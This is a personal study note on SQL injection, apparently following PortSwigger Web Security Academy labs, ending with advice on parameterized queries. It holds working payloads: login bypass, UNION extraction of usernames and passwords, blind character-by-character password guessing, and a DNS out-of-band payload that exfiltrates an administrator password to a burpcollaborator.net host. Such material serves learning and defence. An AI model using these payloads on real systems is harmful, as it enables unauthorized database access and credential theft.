# SQL Injection (severe)



## What is SQL injection?

- it's a vulnerability that allows attacker to query data which can't be normally retrieve or show in application from Database.
- in may cases, it might be deleted or modify, that cause change in application's behaviour.
- Attacker can use this vulnerability to escalate further like to compromise server or backend components.

---

## Impact of SQL injection :

- unauthorized access to sensitive data, such as passwords, credit card details, or personal user information.
- In some cases, an attacker can obtain a persistent backdoor into an organization's systems, leading to a long-term compromise that can go unnoticed for an extended period.

---

### How to Detect SQL injection 💉  Vulnerability ?

1. Submit single quote character ( ' ) and look for error or other anomalies in `**parameters, host, referrer, user-agent & cookie header**`
2. Submit SQL syntax that cause difference in application.
3. Submit boolean conditions like `OR 1=1` and `OR 1=2` 
4. Submit payload that trigger time delay to respond.
5. Submit OAST payload from collaborator or your server.

---

### SQL injection in different part of query :

- Mostly occur in `WHERE clause of SELECT` query.
- `UPDATE` statements, within `updated value or WHERE` clause.
- `INSERT` statements, within `inserted values`.
- `SELECT` statements, within `table or column name`.
- `SELECT` statements, within `ORDER BY` clause.

---

## SQL injection Example :

### 1 . Retrieving hidden data :

where you can modify an SQL query to return additional results.

`https://insecure-website.com/products?category=Gifts`

above link query database as follow to retrieve "Gifts" product. Backend SQL query for this...

`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`

*here * is for retrieve all info from products table whose category is 'Gifts' and released=1 show product is released, we can manipulate released=0 to see unreleased products.*

If application doesn't implement any defense against SQL injection attack, attacker may craft url :

`https://insecure-website.com/products?category=Gifts'--`

*SQL Query* : `SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1`

"—" indicated comment so query after '— will be commented and will show all products from 'Gifts' category.

But if we want to retrieve all data from product table's any category columns, try :

 `https://insecure-website.com/products?category=Gifts'+OR+1=1--`

*SQL Query :* `SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1`

- LAB Solution : Easy Cheezy
    
    In This application, our target is to retrieve all data of product category. Now in this lab click on any product.
    
    `https://xyz.web-security-academy.net/filter?category=Lifestyle`
    
    so for retrieve all product info including unreleased `'+OR+1=1--` payload will work. Append it after above URL as shown belove...
    
    `https://xyz.web-security-academy.net/filter?category=Lifestyle'+OR+1=1—`
    

---

### 2 . Subverting application logic :

where you can change a query to interfere with the application's logic.

Suppose application let user login with credential username : rat and password : cheese

*SQL Query :* `SELECT * FROM users WHERE uname='rat' AND passwd='cheese'`

if this query return user info or boolean TRUE only then user will be logged in.

attacker can login w/o password by using SQL comment sequence to remove password field from query

*SQL Query :* `SELECT * FROM users WHERE uname='admin'—' AND passwd=''`

- LAB Solution :
    
    In Description, username 'administrator' is given so to bypass login we can craft username field administrator'— and in password field 'xyz' (anything).
    
    *SQL Query :* `SELECT * FROM users WHERE username=' administrator'—' AND password='xyz'`
    

---

### 3 . UNION Attacks :

where you can retrieve data from database's different tables.

**Basic Overview :**

If SQL query result are returned in Application's response so we can escalate it further to find data from other tables using **UNION** keyword.

UNION will allow to retrieve data from other table and append it to original query.

suppose following query is execute for name & description from category 'gift' in product table.

SQL Query : `SELECT name, description FROM products WHERE category='Gifts'` 

URL to perform Query : https://vulnerable-site.xyz/products?category=Gifts

we can append result using additional query : ' UNION SELECT username, password FROM users— in URL

URL after append : https://vulnerable-site.xyz/products?category=Gifts' UNION SELECT username, password FROM users—

SQL Query after Append : SELECT name, description FROM products WHERE category='Gifts' UNION SELECT username, password FROM users—'

so last ' will be commented and we can get additional info.

---

**SQL injection UNION attacks :**

UNION keyword can be used to execute more than 1 SELECT queries to append to original query. as we seen in basic overview.

`SELECT a, b FROM table1 UNION SELECT c, d FROM table2`

this query will return a single result set with 2 columns, containing values a, b from table1 and c, d from table2

2 requirement for union query :

- all individual query must return same number of columns
- data types in each column must be compatible between individual query

       e.g: if a is 'int', b is 'char' then c must be 'int', d must be 'char' data-type.

What you should figure out before UNION attack :

- How many columns are being returned from original query?  (same column number)
- Which columns returned from original query are suitable data-type to hold the result from injected query? (same data-type to parallel cols.)

---

**Determine Number of Columns required in UNION attack :**

There is 2 methods to find number of columns returned in original query.

1 . ORDER BY :

This method involves series of `ORDER BY` clauses and increment number index until error occure.

eg :  injection point is string after `WHERE` clause, we would submit...

> ' ORDER BY 1--
> 

> ' ORDER BY 2-- , etc...
> 

The column in an `ORDER BY` clause can be specified by its index, so you don't need to know the names of any columns. When the specified column index exceeds the number of actual columns in the result set, the database returns an error, such as:

Error : `The ORDER BY position number 3 is out of range of the number of items in the select list.`

The application might actually return the database error in its HTTP response, or it might return a generic error, or simply return no results. Provided you can detect some difference in the application's response

2 . UNION SELECT payloads series with NULL values :

' UNION SELECT NULL--

' UNION SELECT NULL, NULL--

' UNION SELECT NULL, NULL, NULL--, etc...

If the number of nulls does not match the number of columns, the database returns an error, such as :

Error : `All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.`

When the number of nulls matches the number of columns, the database returns an additional row in the result set, containing null values in each column. *The effect on the resulting HTTP response depends on the application's code.*

tip : check response size in burp, it may be longer than before or NullPointerException can also occure.

Worst Case : Because of number of NULLs response may not be clear which makes it hard to find columns.

- LAB Solution :
    
    in description, it's said that there is SQL injection vulnerability in product category so first i selected "Tech gifts" from refine search's list so application load page having list of "Tech gifts" page with URL : https://xyz.web-security-academy.net/filter?category=Tech+gifts
    
    i've tried all 2 methods first's query was : `https://xyz.web-security-academy.net/filter?category=Tech+gifts' ORDER BY 3--` and adding 4 in ORDER BY clause so i got internal server (generic error). so i gotta know there is 3 columns  in table but lab wasn't solved so i went 2nd method, whose query was : `https://xyz.web-security-academy.net/filter?category=Tech+gifts' UNION SELECT NULL, NULL, NULL--` and my lab solved so many time one method won't work. hit and try all what u know.
    

> Reason for using NULL : in SELECT query parallel columns datatype must be same where as NULL compatible with all datatype, it maximize chance of payload that will work.
> 

<aside>
💡 Tip for Oracle DB : every SELECT query in Oracle DB must have FROM keyword specifying valid table. dual is a built-in table in Oracle DB. So query would look like : ' UNION SELECT NULL, NULL, .. FROM DUAL--

</aside>

<aside>
💡 Tip for MySQL : On MySQL, the double-dash (--) sequence must be followed by a space. Alternatively, the hash character # can be used to identify a comment.

</aside>

Addition SQL cheat-sheet : [https://portswigger.net/web-security/sql-injection/cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

---

**Find Columns with a useful datatype in an UNION attack :**

Generally interesting data will be in string form, so to find one or more columns whose datatype is compatible with string.

After determining number of columns, probe string data to UNION SELECT payload.

eg : `' UNION SELECT 'a', NULL, NULL--`

`' UNION SELECT NULL, 'a', NULL--` (now suppose if u find 2nd column as string keep it as it is and probe other combination.

eg : `' UNION SELECT NULL, 'a', 'a'--` (if it's string then u would be confirm about it) after it check if 1st column which left is int?

if datatype not match then query will cause error such as :

`Conversion failed when converting the varchar value 'a' to data type int.`

- LAB Solution :
    
    as we have find there is 3 columns using `' UNION SELECT NULL,NULL,NULL--` by appending in URL. now to check for column which is string so one by one remove one NULL and write 'xyz' (given string in lab) and check which column's datatype is string. u can also check further for int, etc. for practice.
    

---

**Using SQL injection attack to retrieve interesting data :**

after knowing datatype of column, now we are in position to find some juicy information.

- The original query returns two columns, both of which can hold string data.
- The injection point is a quoted string within the `WHERE` clause.
- The database contains a table called `users` with the columns `username` and `password`.

So we can retrieve content using following query :

*SQL query :* `' UNION SELECT username, password FROM users--`

But first crucial information needed is name of table and columns. Modern DBs provides way to examine DB structure.

- LAB Solution :
    
    as  described, there is 2 columns named username and password in users table. so in URL append : ' UNION SELECT username, password FROM users-- and we got all usernames and password in application's response so pick password of 'administrator' user and login from 'my account' section. and solved! 
    

---

**Retrieving multiple values within single column :**

in above example, we got username and password as different columns, if we want them both togather with concatenate them. 

SQL query : `' UNION SELECT username || ' : ' || password FROM users--` (for Oracle DB)

Different DB's uses different structures so refer SQL Cheat sheet mentioned above.

- LAB Solution :
    
    as mentioned we have to concat username & password from users table. first find number of columns, i got it 2
    
    imp note : when we write query must take in mind that we can't manipulate number of columns. 
    
    so for 2 columns SQL Query to append in URL is : `' UNION SELECT NULL, username||' : '||password FROM users--` 
    
    (another mistake is in || || don't use " ", use only ' ')
    
    result will be in username : password form after concatenation. take password and login to solve lab!
    

---

### 4 . Examine the Database :

where you can extract information about the version and structure of the database.

**Querying Database type and version :**

different database have different ways of querying their version. probe different structures defined below to find version using UNION.

MSSQL,MySQL : ' UNION SELECT @@version-- 

Oracle : ' UNION SELECT banner FROM v$version-- or ' UNION SELECT version FROM v$instance--

PostgreSQL : ' UNION SELECT version()--

- LAB Solution 1 :
    
    use second payload but remember number of columns can't be changed
    
- LAB Solution 2 :
    
    use first payload but remember number of columns can't be changed
    

**Listing contents of the database :**

we don't know name of tables or columns yet, every database except Oracle provides method `information_schema` to retrieve table names and column names use them to retrieve further data.

*For Tables :*

`SELECT table_name,y,.. FROM information_schema.tables--` 

(table_name can not have fix place as it will come where column will have string datatype but in-between SELECT & FROM)

*For Columns :*

`SELECT column_name,y,.. FROM information_schema.columns WHERE table_name='xyz'--` 

(table_name can not have fix place as it will come where column will have string datatype but in-between SELECT & FROM, table_name will be name of table found from above query)

- LAB Solution :
    
    to be added
    

**Alternet for Oracle for tables & columns :**

*For tables :*

`SELECT table_name,y,z,... FROM all_tables--` (in Oracle FROM keyword is mandatory, dual is default table)

*For Columns :*

`SELECT column_name,y,z,.. FROM all_tab_columns WHERE table_name='x'--`

---

### 5 . Blind SQL Injection :

where the results of a query you control are not returned in the application's responses.

Techniques to Exploit Blind SQL injection vulnerability :

1 . change logic of query that trigger difference in logic of application using conditional query injection like boolean logic that trigger error. eg : x/0 will trigger error.

2 . conditionally trigger time delay, which infer application to delay in time by-processing query to respond.

3 . use out-of-band network interaction, using OAST techniques which is extremely powerful. we can directly exfiltrate data via out-of-band-channel. eg : by placing data into DNS lookup for domain that you control.

with blind SQL injection vulnerability techniques such as UNION attacks are not effective.

---

**Exploiting blind SQL injection by triggering conditional responses**

suppose application uses tracking cookies to get analytics about usage.

*Cookie header :* Cookie : TrackingId=u5YD3PapBcR4lN3e7Tj4hd46

 this request used by application to determine user using SQL query 

SQL Query : `SELECT TrackingID FROM TrackedUsers WHERE TrackingId='u5YD3PapBcR4lN3e7Tj4hd46'`

Suppose, this query is vulnerable to SQL injection but result is not returned in HTML response. but application may behave different depending on whether query returns any data. If it returns data some differences may be noticeable which is enough to be able to exploit blind SQL injection and retrieve info by triggering  different responses depend on injection condition. suppose, we send 2 request in TrackingId cookie value :

Cookie : TrackingId=u5YD3PapBcR4lN3e7Tj4hd46' AND '1'='1

Cookie : TrackingId=u5YD3PapBcR4lN3e7Tj4hd46' AND '1'='2

here in first query both conditions are TRUE so we will get "welcome back" (example) message. where as in second query 2nd condition will be FALSE so message won't be displayed. it allow us to determine answer to any single injected condition, extract data one bit at a time.

Suppose, there is a table called 'Users' with columns 'Username' and 'Password', and a user called *Administrator.* we can determine password of this user by sending series of inputs for test one character at a time.

Start with :

suppose password's first character is greater than 'm' then it will print message.

Next try :

Cookie : TrackingId=u5YD3PapBcR4lN3e7Tj4hd46' AND SUBSTRING((SELECT Password FROM Users WHERE Username='Administrator'),1,1)>'t

suppose that character is not greater than 't'. so it won't print message.

Next try : confirm character if you got by condition.

Cookie : TrackingId=u5YD3PapBcR4lN3e7Tj4hd46' AND SUBSTRING((SELECT Password FROM Users WHERE Username='Administrator'),1,1) = 's

continue this process to determine full password. (Boring Process) try tool ;) 

- LAB Solution :
    
    add solution from kali's vs-code notes
    

---

**Inducing conditional responses by triggering SQL errors**

suppose, as we seen above query was returning 'Welcome Back!' message, but what if no difference is shown after making query?

 Solution, we can make application return error by injection boolean condition. this will cause error if query will be TRUE & if it will be FALSE so there will be no change. we can do reverse also depending on how we give condition.

suppose 2 query will be sent as shown below...

1 ) `SELECT tracking-id FROM track-table where TrackingId='xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a'`

2 ) `SELECT tracking-id FROM track-table where TrackingId='xyz' AND (SELECT CASE WHEN (1=0) THEN 1/0 ELSE 'a' END)='a'`

in first query both are true so as our condition, error will be generated, but not in 2nd one due to divided by 1/0. we can use this to retrieve data by, character by character :

`SELECT tracking-id FROM track-table where TrackingId='xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a`

- LAB Solution :
    
    add solution from kali's vs-code notes.
    

---

**Exploiting blind SQL injection by triggering time delays**

suppose that the application now catches database errors and handles them gracefully or not change in site with right or wrong query. so our upper both methods will fail.

"Because SQL queries are generally processed synchronously by the application, delaying the execution of an SQL query will also delay the HTTP response." so we can notice delay to know about vulnerability. 

but depends on type of database being used.

for MSSQL DB,

`SELECT tracking-id FROM track-table where TrackingId='xyz'; IF (1=2) WAITFOR DELAY '0:0:10'--`

`SELECT tracking-id FROM track-table where TrackingId='xyz'; IF (1=1) WAITFOR DELAY '0:0:10'--`

if condition will be TRUE then & only then Delay will occur. we can use this technique to retrieve data as shown below :

`SELECT tracking-id FROM track-table where TrackingId='xyz'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--`

- LAB Solution 1 :
    
    
- LAB Solution 2 :
    
    

---

**Exploiting blind SQL injection using out-of-band (OAST) techniques**

Suppose, the application carries out the same SQL query, but does it asynchronously.

however none of the techniques described so far will work: the application's response doesn't depend on whether the query returns any data, or on whether a database error occurs, or on the time taken to execute the query, there may still SQLi vulnerability.

A variety of network protocols can be used for Out-of-Band-network purpose to exfiltrate directly within network interaction , but typically the most effective is DNS (domain name service). This is because very many production networks allow free egress of DNS queries, because they are essential for the normal operation of production systems.

DNS Lookup for MSSQL :

`'; exec master..xp_dirtree '//0efdymgw1o5w9inae84dfrgim9ay.burpcollaborator.net/a'--`

this will cause DB to perform lookup for ....

0efdymgw1o5w9inae84dfrgim9ay.burpcollaborator.net

- LAB Sloution :

After confirming a way to trigger Out-of-band interactions, use this channel to exfiltrate data.

 '; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--

use this kind of payload from cheat sheet to exfiltrate data 

Chance of success : very high

- LAB Solution :

---

### Second-Order SQL injection :

First-order SQL injection arises where the application takes user input from an HTTP request and, in the course of processing that request, incorporates the input into an SQL query in an unsafe way.

In second-order SQL injection (also known as stored SQL injection), the application takes user input from an HTTP request and stores it for future use. This is usually done by placing the input into a database, but no vulnerability arises at the point where the data is stored.

Later, when handling a different HTTP request, the application retrieves the stored data and incorporates it into an SQL query in an unsafe way.

This is often done where developer is aware about SQL injection and handle initial data safely to input in database. but when data is proceed later, it seems to be safe as it was safely placed but at after processing in another phase it's handled unsafely as developer deems it to be trusted.

---

### Database Specific factors :

Some core features of the SQL language are implemented in the same way across popular database platforms, and so many ways of detecting and exploiting SQL injection vulnerabilities work identically on different types of database.

However, there are also many differences between common databases.

- Syntax for string concatenation
- comments
- batched or stacked query
- platform specific APIs
- error messages

---

### Mitigation of SQL injection :

Most instances of SQL injection can be prevented by using parameterized queries (also known as prepared statements) instead of string concatenation within the query.

Following code is vulnerable to SQL injection because user input in concatenated directly into query :

`String query = "SELECT * FROM products WHERE category = '"+ input + "'";`

`Statement statement = connection.createStatement();`

`ResultSet resultSet = statement.executeQuery(query);`

This code can be easily rewritten in a way that prevents the user input from interfering with the query structure :

`PreparedStatement statement = connection.prepareStatement("SELECT * FROM products WHERE category = ?");`

`statement.setString(1, input);`

`ResultSet resultSet = statement.executeQuery();`

Parameterized queries can be used for any situation where untrusted input appears as data within the query, including the `WHERE` clause and values in an `INSERT` or `UPDATE` statement. They can't be used to handle untrusted input in other parts of the query, such as table or column names, or the `ORDER BY` clause. Application functionality that places untrusted data into those parts of the query will need to take a different approach, such as white-listing permitted input values, or using different logic to deliver the required behavior.

For a parameterized query to be effective in preventing SQL injection, the string that is used in the query must always be a hard-coded constant, and must never contain any variable data from any origin. Do not be tempted to decide case-by-case whether an item of data is trusted, and continue using string concatenation within the query for cases that are considered safe. It is all too easy to make mistakes about the possible origin of data, or for changes in other code to violate assumptions about what data is tainted.

1. **Trust no-one:** Assume all user-submitted data is evil and validate and sanitize everything.
2. **Don’t use dynamic SQL when it can be avoided:** used prepared statements, parameterized queries or stored procedures instead whenever possible.
3. **Update and patch**: vulnerabilities in applications and databases that hackers can exploit using SQL injection are regularly discovered, so it’s vital to apply patches and updates as soon as practical.
4. **Firewall:** Consider a web application firewall (WAF) – either software or appliance based – to help filter out malicious data. Good ones will have a comprehensive set of default rules, and make it easy to add new ones whenever necessary. A WAF can be particularly useful to provide some security protection against a particular new vulnerability before a patch is available.
5. **Reduce your attack surface:** Get rid of any database functionality that you don’t need to prevent a hacker taking advantage of it. For example, the xp_cmdshell extended stored procedure in MS SQL spawns a Windows command shell and passes in a string for execution, which could be very useful indeed for a hacker. The Windows process spawned by **xp_cmdshell**has the same security privileges as the SQL Server service account.
6. **Use appropriate privileges:**don’t connect to your database using an account with admin-level privileges unless there is some compelling reason to do so. Using a limited access account is far safer, and can limit what a hacker is able to do.
7. **Keep your secrets secret:**Assume that your application is not secure and act accordingly by encrypting or hashing passwords and other confidential data including connection strings.
8. **Don’t divulge more information than you need to:**hackers can learn a great deal about database architecture from error messages, so ensure that they display minimal information. Use the “RemoteOnly” customErrors mode (or equivalent) to display verbose error messages on the local machine while ensuring that an external hacker gets nothing more than the fact that his actions resulted in an unhandled error.
9. **Don’t forget the basics:** Change the passwords of application accounts into the database regularly. This is common sense, but in practice these passwords often stay unchanged for months or even years.
10. **Buy better software:** Make code writers responsible for checking the code and for fixing security flaws in custom applications before the software is delivered.
